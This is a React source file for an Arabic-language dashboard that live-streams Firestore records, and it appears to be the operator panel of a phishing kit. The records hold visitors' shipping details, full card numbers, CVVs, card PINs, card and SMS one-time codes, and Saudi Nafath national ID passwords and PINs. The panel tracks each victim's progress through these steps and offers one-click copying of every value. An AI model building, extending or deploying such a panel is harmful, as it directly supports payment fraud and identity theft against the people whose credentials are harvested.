"use client";

import { useEffect, useMemo, useState } from "react";
import {
  collection,
  onSnapshot,
  orderBy,
  query,
  doc,
  deleteDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { useToast } from "@/hooks/use-toast";
import {
  Search,
  Send,
  CreditCard,
  MapPin,
  Phone,
  Shield,
  Package,
  Globe,
  KeyRound,
  Lock,
  Trash2,
  Copy,
  Check,
  CircleUser,
  Eye,
  EyeOff,
  Settings,
} from "lucide-react";

type FirestoreDoc = Record<string, any> & { __id: string };

// Field categorization (for the timeline message bubbles)
const SECTIONS: {
  key: string;
  title: string;
  icon: any;
  color: string;
  fields: { key: string; label: string; sensitive?: boolean }[];
}[] = [
  {
    key: "visit",
    title: "زيارة الموقع",
    icon: Globe,
    color: "from-sky-500 to-blue-600",
    fields: [
      { key: "country", label: "الدولة" },
      { key: "currentPage", label: "الصفحة" },
      { key: "action", label: "الحدث" },
      { key: "createdDate", label: "تاريخ الزيارة" },
    ],
  },
  {
    key: "shipping",
    title: "بيانات الشحن",
    icon: MapPin,
    color: "from-emerald-500 to-teal-600",
    fields: [
      { key: "fullName", label: "الاسم" },
      { key: "phone", label: "الجوال" },
      { key: "city", label: "المدينة" },
      { key: "district", label: "الحي" },
      { key: "street", label: "الشارع" },
      { key: "postalCode", label: "الرمز البريدي" },
      { key: "coordinates", label: "الإحداثيات" },
    ],
  },
  {
    key: "payment",
    title: "بيانات البطاقة",
    icon: CreditCard,
    color: "from-violet-500 to-purple-600",
    fields: [
      { key: "cardName", label: "حامل البطاقة" },
      { key: "cardNumber", label: "رقم البطاقة", sensitive: true },
      { key: "expiryDate", label: "الانتهاء" },
      { key: "cvv", label: "CVV", sensitive: true },
      { key: "cardLast4", label: "آخر ٤ أرقام" },
      { key: "bank", label: "البنك" },
      { key: "cardType", label: "نوع البطاقة" },
    ],
  },
  {
    key: "card_verify",
    title: "تحقق البطاقة",
    icon: Lock,
    color: "from-amber-500 to-orange-600",
    fields: [
      { key: "cardOtp", label: "رمز التحقق" },
      { key: "cardPin", label: "PIN", sensitive: true },
    ],
  },
  {
    key: "phone_verify",
    title: "تحقق الجوال",
    icon: Phone,
    color: "from-pink-500 to-rose-600",
    fields: [
      { key: "phone2", label: "الجوال الثاني" },
      { key: "operator", label: "المشغل" },
      { key: "phoneOtp", label: "رمز SMS" },
    ],
  },
  {
    key: "nafath",
    title: "نفاذ",
    icon: Shield,
    color: "from-green-600 to-emerald-700",
    fields: [
      { key: "nafazId", label: "رقم الهوية" },
      { key: "identity_number", label: "رقم الهوية" },
      { key: "nafadPassword", label: "كلمة المرور", sensitive: true },
      { key: "auth_number", label: "رقم التفويض" },
      { key: "nafaz_pin", label: "Nafath PIN" },
      { key: "verification_code", label: "رمز التحقق" },
      { key: "status", label: "حالة نفاذ" },
    ],
  },
  {
    key: "order",
    title: "ملخص الطلب",
    icon: Package,
    color: "from-indigo-500 to-blue-700",
    fields: [
      { key: "subtotal", label: "المجموع" },
      { key: "shippingFee", label: "الشحن" },
      { key: "tax", label: "الضريبة" },
      { key: "total", label: "الإجمالي" },
    ],
  },
];

const ALL_KNOWN_KEYS = new Set(
  SECTIONS.flatMap((s) => s.fields.map((f) => f.key))
);

function formatTimestamp(value: any): string {
  if (!value) return "";
  try {
    const date =
      typeof value?.toDate === "function"
        ? value.toDate()
        : typeof value === "string"
        ? new Date(value)
        : value instanceof Date
        ? value
        : null;
    if (!date) return "";
    const now = new Date();
    const sameDay = date.toDateString() === now.toDateString();
    if (sameDay) {
      return date.toLocaleTimeString("ar-SA", {
        hour: "2-digit",
        minute: "2-digit",
      });
    }
    return date.toLocaleDateString("ar-SA", {
      day: "2-digit",
      month: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return "";
  }
}

function timeAgo(value: any): string {
  if (!value) return "";
  try {
    const date =
      typeof value?.toDate === "function"
        ? value.toDate()
        : new Date(value);
    const diffSec = Math.floor((Date.now() - date.getTime()) / 1000);
    if (diffSec < 60) return "الآن";
    if (diffSec < 3600) return `منذ ${Math.floor(diffSec / 60)} د`;
    if (diffSec < 86400) return `منذ ${Math.floor(diffSec / 3600)} س`;
    return `منذ ${Math.floor(diffSec / 86400)} ي`;
  } catch {
    return "";
  }
}

function formatValue(v: any): string {
  if (v === undefined || v === null) return "—";
  if (typeof v === "boolean") return v ? "نعم" : "لا";
  if (typeof v === "object") {
    if (typeof v?.toDate === "function") return formatTimestamp(v);
    if (Array.isArray(v)) return v.map((x) => formatValue(x)).join("، ");
    return JSON.stringify(v, null, 2);
  }
  return String(v);
}

function getInitials(d: FirestoreDoc): string {
  const name = (d.fullName || d.cardName || d.__id || "?").trim();
  if (!name) return "?";
  return name.charAt(0).toUpperCase();
}

const AVATAR_COLORS = [
  "from-pink-500 to-rose-600",
  "from-violet-500 to-indigo-600",
  "from-emerald-500 to-teal-600",
  "from-amber-500 to-orange-600",
  "from-sky-500 to-blue-600",
  "from-fuchsia-500 to-purple-600",
  "from-lime-500 to-green-600",
  "from-cyan-500 to-blue-600",
];

function avatarColor(id: string): string {
  let h = 0;
  for (let i = 0; i < id.length; i++) h = (h * 31 + id.charCodeAt(i)) >>> 0;
  return AVATAR_COLORS[h % AVATAR_COLORS.length];
}

function getStageInfo(d: FirestoreDoc): { label: string; color: string } {
  if (d.nafazId || d.identity_number) return { label: "نفاذ", color: "bg-emerald-500" };
  if (d.cardPin || d.cardOtp) return { label: "تحقق بطاقة", color: "bg-amber-500" };
  if (d.cardNumber) return { label: "بطاقة", color: "bg-violet-500" };
  if (d.phone2 || d.phoneOtp) return { label: "تحقق جوال", color: "bg-pink-500" };
  if (d.fullName || d.phone) return { label: "شحن", color: "bg-sky-500" };
  return { label: "زائر", color: "bg-zinc-500" };
}

function getPreview(d: FirestoreDoc): string {
  if (d.nafazId) return `هوية: ${d.nafazId}`;
  if (d.cardPin) return `PIN: ${"•".repeat(String(d.cardPin).length)}`;
  if (d.cardOtp) return `رمز: ${d.cardOtp}`;
  if (d.cardNumber) return `بطاقة: •••• ${String(d.cardNumber).slice(-4)}`;
  if (d.phoneOtp) return `SMS: ${d.phoneOtp}`;
  if (d.phone2) return `جوال ٢: ${d.phone2}`;
  if (d.fullName) return `${d.fullName} • ${d.city || ""}`;
  if (d.country) return `زيارة من ${d.country}`;
  if (d.action) return d.action;
  return "بيانات جديدة";
}

function maskValue(value: any): string {
  const s = String(value ?? "");
  if (s.length <= 4) return "•".repeat(s.length);
  return s.slice(0, 2) + "•".repeat(Math.max(2, s.length - 4)) + s.slice(-2);
}

export default function Dashboard() {
  const [docs, setDocs] = useState<FirestoreDoc[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [revealSensitive, setRevealSensitive] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    if (!db) {
      setLoading(false);
      return;
    }
    const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
    const unsub = onSnapshot(
      q,
      (snap) => {
        const items: FirestoreDoc[] = snap.docs.map((d) => ({
          __id: d.id,
          ...(d.data() as any),
        }));
        setDocs(items);
        setLoading(false);
        setSelectedId((prev) => prev ?? items[0]?.__id ?? null);
      },
      (err) => {
        console.error("Firestore error:", err);
        setLoading(false);
        toast({
          title: "تعذر تحميل البيانات",
          description: err.message,
          variant: "destructive",
        });
      }
    );
    return () => unsub();
  }, [toast]);

  const filtered = useMemo(() => {
    if (!search.trim()) return docs;
    const s = search.trim().toLowerCase();
    return docs.filter((d) => {
      const blob = JSON.stringify(d).toLowerCase();
      return blob.includes(s);
    });
  }, [docs, search]);

  const selected = useMemo(
    () => docs.find((d) => d.__id === selectedId) ?? null,
    [docs, selectedId]
  );

  const sectionsForSelected = useMemo(() => {
    if (!selected) return [];
    return SECTIONS.map((section) => {
      const present = section.fields.filter(
        (f) => selected[f.key] !== undefined && selected[f.key] !== ""
      );
      return { ...section, presentFields: present };
    }).filter((s) => s.presentFields.length > 0);
  }, [selected]);

  const otherFields = useMemo(() => {
    if (!selected) return [];
    return Object.entries(selected)
      .filter(
        ([k]) =>
          !ALL_KNOWN_KEYS.has(k) &&
          !["__id", "timestamp", "updatedAt", "verified", "verifiedAt"].includes(k)
      )
      .filter(([_, v]) => v !== undefined && v !== "" && v !== null);
  }, [selected]);

  async function handleCopy(key: string, value: any) {
    try {
      await navigator.clipboard.writeText(String(value));
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 1200);
    } catch {
      toast({ title: "تعذر النسخ", variant: "destructive" });
    }
  }

  async function handleDelete() {
    if (!selected) return;
    if (!confirm(`حذف السجل ${selected.__id}؟`)) return;
    try {
      await deleteDoc(doc(db, "orders", selected.__id));
      toast({ title: "تم الحذف" });
      setSelectedId(null);
    } catch (e: any) {
      toast({ title: "تعذر الحذف", description: e.message, variant: "destructive" });
    }
  }

  return (
    <div dir="rtl" className="h-screen w-full bg-[#0e1621] text-white flex overflow-hidden font-sans">
      {/* Left sidebar (chat list) */}
      <aside className="w-[340px] shrink-0 border-l border-white/5 bg-[#17212b] flex flex-col">
        {/* Header */}
        <div className="h-16 px-4 flex items-center justify-between border-b border-white/5 bg-[#17212b]">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-full bg-gradient-to-br from-primary to-emerald-700 flex items-center justify-center">
              <Settings className="h-4 w-4 text-white" />
            </div>
            <div>
              <h1 className="text-sm font-bold leading-none">لوحة التحكم</h1>
              <p className="text-[11px] text-white/50 mt-1">
                {docs.length} سجل
              </p>
            </div>
          </div>
          <Button
            variant="ghost"
            size="icon"
            className="text-white/60 hover:text-white hover:bg-white/10 rounded-full h-8 w-8"
            aria-label="إعدادات العرض"
            onClick={() => setRevealSensitive((v) => !v)}
            data-testid="button-toggle-sensitive"
            title={revealSensitive ? "إخفاء الحساس" : "إظهار الحساس"}
          >
            {revealSensitive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          </Button>
        </div>

        {/* Search */}
        <div className="p-3 border-b border-white/5">
          <div className="relative">
            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
            <Input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="بحث"
              className="bg-[#242f3d] border-transparent text-sm h-9 rounded-full pr-10 text-right placeholder:text-white/40 focus-visible:ring-1 focus-visible:ring-primary"
              data-testid="input-dashboard-search"
            />
          </div>
        </div>

        {/* Chat list */}
        <ScrollArea className="flex-1">
          {loading && (
            <div className="p-4 text-center text-white/50 text-sm">جارٍ التحميل...</div>
          )}

          {!loading && filtered.length === 0 && (
            <div className="p-8 text-center text-white/50 text-sm">
              لا توجد بيانات بعد
            </div>
          )}

          {!loading &&
            filtered.map((d) => {
              const stage = getStageInfo(d);
              return (
                <button
                  key={d.__id}
                  onClick={() => setSelectedId(d.__id)}
                  className={cn(
                    "w-full text-right px-3 py-3 flex items-center gap-3 hover:bg-white/5 transition-colors border-b border-white/[0.03]",
                    selectedId === d.__id && "bg-primary/15 hover:bg-primary/15"
                  )}
                  data-testid={`row-chat-${d.__id}`}
                >
                  <div
                    className={cn(
                      "w-12 h-12 rounded-full bg-gradient-to-br flex items-center justify-center text-white font-bold text-lg shrink-0 shadow-md",
                      avatarColor(d.__id)
                    )}
                  >
                    {getInitials(d)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[11px] text-white/40 shrink-0">
                        {timeAgo(d.timestamp)}
                      </span>
                      <span
                        className="text-sm font-semibold truncate"
                        data-testid={`text-chat-name-${d.__id}`}
                      >
                        {d.fullName || d.cardName || d.__id}
                      </span>
                    </div>
                    <div className="flex items-center justify-between gap-2">
                      <span className={cn("h-2 w-2 rounded-full shrink-0", stage.color)} title={stage.label} />
                      <span className="text-xs text-white/60 truncate">
                        {getPreview(d)}
                      </span>
                    </div>
                  </div>
                </button>
              );
            })}
        </ScrollArea>
      </aside>

      {/* Right panel (chat detail) */}
      <main className="flex-1 flex flex-col min-w-0 bg-[radial-gradient(ellipse_at_center,#1c2533,#0e1621)]">
        {!selected ? (
          <div className="flex-1 flex items-center justify-center text-center p-8">
            <div>
              <div className="w-20 h-20 rounded-full bg-white/5 flex items-center justify-center mx-auto mb-4">
                <CircleUser className="h-10 w-10 text-white/30" />
              </div>
              <p className="text-white/50 text-sm">اختر سجلاً من القائمة لعرض تفاصيله</p>
            </div>
          </div>
        ) : (
          <>
            {/* Conversation header */}
            <div className="h-16 px-5 flex items-center justify-between border-b border-white/5 bg-[#17212b]">
              <div className="flex items-center gap-3">
                <div
                  className={cn(
                    "w-10 h-10 rounded-full bg-gradient-to-br flex items-center justify-center text-white font-bold shadow-md",
                    avatarColor(selected.__id)
                  )}
                >
                  {getInitials(selected)}
                </div>
                <div>
                  <h2 className="text-sm font-bold" data-testid="text-detail-name">
                    {selected.fullName || selected.cardName || selected.__id}
                  </h2>
                  <p className="text-[11px] text-white/50 mt-0.5">
                    {selected.country ? `${selected.country} • ` : ""}
                    {timeAgo(selected.timestamp)}
                  </p>
                </div>
              </div>
              <Button
                variant="ghost"
                size="icon"
                className="text-white/60 hover:text-red-400 hover:bg-red-500/10 rounded-full h-9 w-9"
                aria-label="حذف السجل"
                onClick={handleDelete}
                data-testid="button-delete-record"
              >
                <Trash2 className="h-4 w-4" />
              </Button>
            </div>

            {/* Messages */}
            <ScrollArea className="flex-1 px-3 sm:px-6 py-6">
              <div className="max-w-3xl mx-auto space-y-4">
                {sectionsForSelected.map((section) => (
                  <article
                    key={section.key}
                    className="flex items-start gap-3"
                    data-testid={`section-${section.key}`}
                  >
                    <div
                      className={cn(
                        "w-9 h-9 rounded-full bg-gradient-to-br flex items-center justify-center shrink-0 shadow-md",
                        section.color
                      )}
                    >
                      <section.icon className="h-4 w-4 text-white" />
                    </div>

                    <div className="flex-1 min-w-0">
                      <div className="bg-[#182533] border border-white/[0.06] rounded-2xl rounded-tr-sm px-4 py-3 shadow-sm">
                        <header className="flex items-center justify-between mb-3">
                          <span className="text-[10px] text-white/40">
                            {formatTimestamp(selected.timestamp)}
                          </span>
                          <h3 className="text-sm font-bold text-primary">
                            {section.title}
                          </h3>
                        </header>

                        <dl className="space-y-2">
                          {section.presentFields.map((f) => {
                            const raw = selected[f.key];
                            const isSensitive = f.sensitive && !revealSensitive;
                            const display = isSensitive
                              ? maskValue(raw)
                              : formatValue(raw);
                            const copyKey = `${section.key}-${f.key}`;
                            return (
                              <div
                                key={f.key}
                                className="group flex items-start justify-between gap-3 py-1.5 border-b border-white/[0.04] last:border-0"
                              >
                                <button
                                  onClick={() => handleCopy(copyKey, raw)}
                                  className="text-white/50 hover:text-primary focus-visible:text-primary focus-visible:opacity-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/50 rounded transition-colors opacity-0 group-hover:opacity-100 shrink-0 mt-0.5"
                                  aria-label={`نسخ ${f.label}`}
                                  data-testid={`button-copy-${copyKey}`}
                                >
                                  {copiedKey === copyKey ? (
                                    <Check className="h-3.5 w-3.5 text-primary" />
                                  ) : (
                                    <Copy className="h-3.5 w-3.5" />
                                  )}
                                </button>
                                <div className="flex-1 text-right min-w-0">
                                  <dt className="text-[11px] text-white/45 mb-0.5">
                                    {f.label}
                                    {f.sensitive && (
                                      <KeyRound className="inline h-3 w-3 mr-1 text-amber-500/60" />
                                    )}
                                  </dt>
                                  <dd
                                    className="text-sm font-medium text-white break-words font-mono tracking-wide"
                                    data-testid={`value-${copyKey}`}
                                  >
                                    {display}
                                  </dd>
                                </div>
                              </div>
                            );
                          })}
                        </dl>
                      </div>
                    </div>
                  </article>
                ))}

                {/* Other / unknown fields */}
                {otherFields.length > 0 && (
                  <article className="flex items-start gap-3">
                    <div className="w-9 h-9 rounded-full bg-gradient-to-br from-zinc-500 to-zinc-700 flex items-center justify-center shrink-0 shadow-md">
                      <Send className="h-4 w-4 text-white" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="bg-[#182533] border border-white/[0.06] rounded-2xl rounded-tr-sm px-4 py-3">
                        <h3 className="text-sm font-bold text-white/70 mb-3 text-right">
                          بيانات إضافية
                        </h3>
                        <dl className="space-y-2">
                          {otherFields.map(([k, v]) => (
                            <div
                              key={k}
                              className="py-1.5 border-b border-white/[0.04] last:border-0 text-right"
                            >
                              <dt className="text-[11px] text-white/45 mb-0.5">
                                {k}
                              </dt>
                              <dd className="text-sm text-white break-words font-mono">
                                {formatValue(v)}
                              </dd>
                            </div>
                          ))}
                        </dl>
                      </div>
                    </div>
                  </article>
                )}

                {/* Footer info */}
                <div className="flex items-center justify-center pt-4">
                  <Badge
                    variant="outline"
                    className="bg-white/5 border-white/10 text-white/50 text-[11px] font-normal"
                  >
                    معرف السجل: {selected.__id}
                  </Badge>
                </div>
              </div>
            </ScrollArea>
          </>
        )}
      </main>
    </div>
  );
}
